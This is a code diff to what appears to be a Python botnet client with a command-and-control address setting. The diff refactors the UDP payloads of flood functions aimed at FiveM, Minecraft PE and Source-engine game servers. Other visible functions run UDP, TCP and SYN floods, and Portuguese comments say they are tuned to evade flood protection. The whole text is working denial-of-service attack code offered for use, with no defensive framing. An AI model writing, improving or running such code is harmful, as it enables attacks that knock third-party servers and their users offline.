@@ -8,6 +8,15 @@ import random
 C2_ADDRESS  = ""
 C2_PORT     = 101
 
+
+# Payload para FiveM (servidores de GTA V)
+payload_fivem = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
+# Payload para VSE (servidores diversos)
+payload_vse = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
+# Payload para MCPE (Minecraft PE)
+payload_mcpe = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'
+
+
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
@@ -24,28 +33,22 @@ def rand_ua():
 
 
 def attack_fivem(ip, port, secs):
-    payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while time.time() < secs:
-        s.sendto(payload, (ip, port))
+        s.sendto(payload_fivem, (ip, port))
 
 
 def attack_mcpe(ip, port, secs):
-    payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
-               b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
-               b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
-               b'\x73')
+    """Funciona muito bem em Realms Servers"""
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while time.time() < secs:
-        s.sendto(payload, (ip, port))
+        s.sendto(payload_mcpe, (ip, port))
 
 
 def attack_vse(ip, port, secs):
-    payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
-               b'\x20\x51\x75\x65\x72\x79\x00')
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while time.time() < secs:
-        s.sendto(payload, (ip, port))
+        s.sendto(payload_vse, (ip, port))
 
 
 def attack_hex(ip, port, secs):
@@ -60,6 +63,7 @@ def attack_hex(ip, port, secs):
 def attack_udp_bypass(ip, port, secs):
     PACKET_SIZES = [64, 128, 256, 512, 1024]
     DELAY_RANGE = (0.05, 0.2)
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while time.time() < secs:
@@ -73,11 +77,11 @@ def attack_udp_bypass(ip, port, secs):
 def attack_tcp_bypass(ip, port, secs):
     """Tenta contornar proteção adicionando delays."""
     PACKET_SIZES = [64, 128, 256, 512, 1024]
-    DELAYS = (0.05, 0.5)
-    
+    packet_size = random.choice(PACKET_SIZES) 
     while time.time() < secs:
-        packet_size = random.choice(PACKET_SIZES) 
         packet = random._urandom(packet_size)
+
+        DELAYS = (0.05, 0.5)
         DELAY = random.uniform(*DELAYS)
 
         try:
@@ -122,7 +126,7 @@ def attack_tcp_udp_bypass(ip, port, secs):
 
 
 def attack_syn(ip, port, secs):
-    """Melhorado para contornar a proteção de SYN flood com variação de pacotes."""
+    """Melhorado para contornar proteções simples de SYN flood com variação de pacotes."""
     PACKET_SIZES = [64, 128, 256, 512, 1024]
     DELAYS = (0.01, 0.5)
 
